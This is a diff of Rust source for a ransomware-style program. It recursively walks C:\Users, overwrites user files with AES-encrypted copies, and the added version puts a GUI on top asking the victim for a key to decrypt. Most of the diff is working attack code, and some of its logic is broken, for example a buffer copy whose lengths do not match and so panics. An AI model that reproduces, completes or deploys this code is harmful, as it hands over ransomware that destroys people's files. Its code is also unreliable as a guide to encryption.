@@ -1,12 +1,12 @@
-use aes::Aes256;
-use aes::cipher::{BlockEncrypt, BlockDecrypt, KeyInit}; // Import traits for encryption and decryption
+use aes::Aes128;
+use aes::cipher::{BlockEncrypt, BlockDecrypt, KeyInit};
 use std::fs::{self, File};
 use std::io::{self, Read, Write};
 use std::path::Path;
 use std::sync::{Arc, atomic::{AtomicUsize, Ordering}};
 use rayon::prelude::*;
 use std::ffi::OsStr;
-use std::io::{stdin, stdout}; // For handling user input
+use eframe::egui;
 
 #[derive(Default)]
 struct TraversalStats {
@@ -18,55 +18,60 @@ struct TraversalStats {
     decryption_errors: AtomicUsize,
 }
 
-fn main() {
-    // Hard-coded encryption key
-    let key = b"an example very very secret key."; // Use a 32-byte key for AES-256
-
-    // Specify the directory you wish to encrypt, e.g., C:\\Users for personal files
-    let target_dir = Path::new("C:\\Users");
-    let stats = Arc::new(TraversalStats::default());
-
-    // Encrypt the files first
-    if let Err(e) = traverse_directory(target_dir, Arc::clone(&stats), key, true) {
-        eprintln!("An error occurred during encryption: {}", e);
-    }
-
-    println!("Encryption completed.");
-    println!("Files encrypted: {}", stats.files_count.load(Ordering::Relaxed));
-    println!("Directories traversed: {}", stats.directories_count.load(Ordering::Relaxed));
-    println!("Permission errors encountered: {}", stats.permission_errors.load(Ordering::Relaxed));
-    println!("Encryption errors encountered: {}", stats.encryption_errors.load(Ordering::Relaxed));
-    println!("Other errors encountered: {}", stats.other_errors.load(Ordering::Relaxed));
-
-    // Ask for the decryption key and decrypt the files
-    let user_key = prompt_for_key();
-    if let Err(e) = traverse_directory(target_dir, Arc::clone(&stats), &user_key, false) {
-        eprintln!("An error occurred during decryption: {}", e);
-    }
-
-    println!("Decryption completed.");
-    println!("Files decrypted: {}", stats.files_count.load(Ordering::Relaxed));
+struct MyApp {
+    key: String,
 }
 
-// Function to prompt the user for the secret key
-fn prompt_for_key() -> Vec<u8> {
-    let mut key = String::new();
-    print!("Enter your secret key to decrypt the files: ");
-    let _ = stdout().flush(); // Flush the stdout buffer to ensure the prompt appears
-    stdin().read_line(&mut key).expect("Failed to read line");
-    
-    // Ensure the key is exactly 32 bytes, if not, pad or truncate it.
-    let mut key_bytes = key.trim().as_bytes().to_vec();
-    if key_bytes.len() < 32 {
-        key_bytes.resize(32, 0); // Pad with zeros if the key is too short
-    } else if key_bytes.len() > 32 {
-        key_bytes.truncate(32); // Truncate if the key is too long
+impl Default for MyApp {
+    fn default() -> Self {
+        Self { key: String::new() }
     }
-    
-    key_bytes
 }
 
-// Function to traverse directories and encrypt/decrypt files
+impl eframe::App for MyApp {
+    fn update(&mut self, ctx: &egui::Context, _frame: &mut eframe::Frame) {
+        egui::CentralPanel::default().show(ctx, |ui| {
+            ui.label("Enter your secret key for decryption:");
+            ui.text_edit_singleline(&mut self.key);
+
+            if ui.button("Decrypt Files").clicked() {
+                let key_bytes = self.prepare_key();
+                let target_dir = Path::new("C:\\Users");
+                let stats = Arc::new(TraversalStats::default());
+
+                // Decrypt the files
+                if let Err(e) = traverse_directory(target_dir, Arc::clone(&stats), &key_bytes, false) {
+                    eprintln!("An error occurred during decryption: {}", e);
+                }
+
+                println!("Decryption completed.");
+                println!("Files decrypted: {}", stats.files_count.load(Ordering::Relaxed));
+            }
+        });
+    }
+}
+
+impl MyApp {
+    fn prepare_key(&self) -> Vec<u8> {
+        let mut key_bytes = self.key.trim().as_bytes().to_vec();
+        if key_bytes.len() < 16 {
+            key_bytes.resize(16, 0); // Pad with zeros if the key is too short
+        } else if key_bytes.len() > 16 {
+            key_bytes.truncate(16); // Truncate if the key is too long
+        }
+        key_bytes
+    }
+}
+
+fn main() -> Result<(), eframe::Error> {
+    let options = eframe::NativeOptions::default();
+    eframe::run_native(
+        "File Encryptor/Decryptor",
+        options,
+        Box::new(|_cc| Ok(Box::<MyApp>::default())),
+    )
+}
+
 fn traverse_directory(dir: &Path, stats: Arc<TraversalStats>, key: &[u8], encrypt: bool) -> std::io::Result<()> {
     // Skip system directories like "C:\\Windows", "C:\\Program Files", etc.
     if should_skip_directory(dir) {
@@ -123,7 +128,6 @@ fn traverse_directory(dir: &Path, stats: Arc<TraversalStats>, key: &[u8], encryp
     Ok(())
 }
 
-// Function to check if the directory is a system directory that should be skipped
 fn should_skip_directory(dir: &Path) -> bool {
     let system_dirs = vec![
         OsStr::new("Windows"),
@@ -148,38 +152,40 @@ fn should_skip_directory(dir: &Path) -> bool {
     false
 }
 
-// Function to encrypt a single file
 fn encrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
-    // Read the file contents
     let mut file = File::open(path)?;
     let mut contents = Vec::new();
     file.read_to_end(&mut contents)?;
 
-    // Encrypt the contents (simple example using AES block encryption)
-    let cipher = Aes256::new_from_slice(key).unwrap(); // Initialize AES cipher
-    let mut buffer = [0u8; 16]; // Buffer for block size (AES block size is 16 bytes)
-    cipher.encrypt_block((&mut buffer).into()); // Encrypt one block (this is a simplification)
+    let cipher = Aes128::new_from_slice(key).unwrap(); 
+    let mut buffer = vec![0u8; (contents.len() + 15) / 16 * 16];
+    buffer.copy_from_slice(&contents);
 
-    // Write the encrypted content back to the file (or to a new file)
+    for block in buffer.chunks_mut(16) {
+        cipher.encrypt_block(block.into());
+    }
+
     let mut encrypted_file = File::create(path)?;
     encrypted_file.write_all(&buffer)?;
 
     Ok(())
 }
 
-// Function to decrypt a single file
 fn decrypt_file(path: &Path, key: &[u8]) -> io::Result<()> {
-    // Read the encrypted file contents
     let mut file = File::open(path)?;
     let mut contents = Vec::new();
     file.read_to_end(&mut contents)?;
 
-    // Decrypt the contents (simple example using AES block decryption)
-    let cipher = Aes256::new_from_slice(key).unwrap(); // Initialize AES cipher
-    let mut buffer = [0u8; 16]; // Buffer for block size (AES block size is 16 bytes)
-    cipher.decrypt_block((&mut buffer).into()); // Decrypt one block (this is a simplification)
+    let cipher = Aes128::new_from_slice(key).unwrap();
+    let mut buffer = vec![0u8; contents.len()];
 
-    // Write the decrypted content back to the file (or to a new file)
+    for (i, block) in contents.chunks(16).enumerate() {
+        let mut block_buf = [0u8; 16];
+        block_buf.copy_from_slice(block);
+        cipher.decrypt_block(&mut block_buf.into());
+        buffer[i * 16..(i + 1) * 16].copy_from_slice(&block_buf);
+    }
+
     let mut decrypted_file = File::create(path)?;
     decrypted_file.write_all(&buffer)?;
 
